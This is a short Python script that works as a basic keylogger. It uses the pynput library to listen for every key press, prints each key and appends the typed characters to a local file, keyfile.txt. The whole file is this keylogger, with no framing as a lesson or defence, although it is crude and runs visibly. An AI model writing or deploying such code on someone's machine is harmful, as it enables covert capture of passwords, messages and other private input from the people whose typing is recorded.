from pynput import keyboard

def KeyPressed(key):
    print(str(key))
    with open("keyfile.txt", 'a') as logKey:
        try:
            char = key.char
            logKey.write(char)
        except:
            print("Error getting the char")

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=KeyPressed)
    listener.start()
    input()